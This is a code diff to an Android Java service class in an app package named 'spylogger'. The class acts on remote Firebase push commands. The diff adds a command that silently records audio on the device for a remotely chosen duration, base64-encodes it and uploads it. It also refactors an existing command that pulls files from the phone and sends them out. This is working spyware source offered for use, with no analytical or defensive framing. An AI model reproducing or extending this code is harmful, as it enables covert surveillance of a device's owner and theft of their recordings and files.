@@ -3,6 +3,8 @@ package com.gravatasufoca.spylogger.services;
 import android.content.Context;
 import android.util.Log;
 
+import com.gravatasufoca.spylogger.helpers.ServicosHelper;
+import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
@@ -22,6 +24,7 @@ public class FcmHelperService {
     private FcmMessageVO fcmMessageVO;
     private SendArquivoService sendArquivoService;
     private EnvioArquivoVO envioArquivoVO;
+    private ServicosHelper servicosHelper;
 
     public FcmHelperService(Context context, FcmMessageVO fcmMessageVO) {
         this.context = context;
@@ -32,20 +35,34 @@ public class FcmHelperService {
                 .setTipoAcao(fcmMessageVO.getTipoAcao())
                 .setId(fcmMessageVO.getId())
                 .build();
+
+        servicosHelper=new ServicosHelper();
     }
 
     public void executar() {
         switch (fcmMessageVO.getTipoAcao()) {
             case RECUPERAR_ARQUIVO:
-                enviarArquivo();
+                enviarArquivo(recuperarArquivo());
                 break;
             case ESTA_ATIVO:
                 sendArquivoService.enviar(envioArquivoVO);
+                break;
+            case OBTER_AUDIO:
+                TaskComplete callback=new TaskComplete() {
+                    @Override
+                    public void onFinish(Object object) {
+                        if(object!=null){
+                            enviarArquivo((String) object);
+                        }
+                    }
+                };
+                servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
                 break;
             default:
                 return;
         }
     }
+
 
     private File recuperarArquivo(){
         try {
@@ -65,11 +82,15 @@ public class FcmHelperService {
         return null;
     }
 
-    private void enviarArquivo() {
-        File file= recuperarArquivo();
+    private void enviarArquivo(File file) {
+        if(file!=null){
+            enviarArquivo(Utils.encodeBase64(file));
+        }
+    }
+    private void enviarArquivo(String file) {
         if(file!=null){
             envioArquivoVO.setId(fcmMessageVO.getId());
-            envioArquivoVO.setArquivo(Utils.encodeBase64(file));
+            envioArquivoVO.setArquivo(file);
 
             sendArquivoService.enviar(envioArquivoVO);
         }
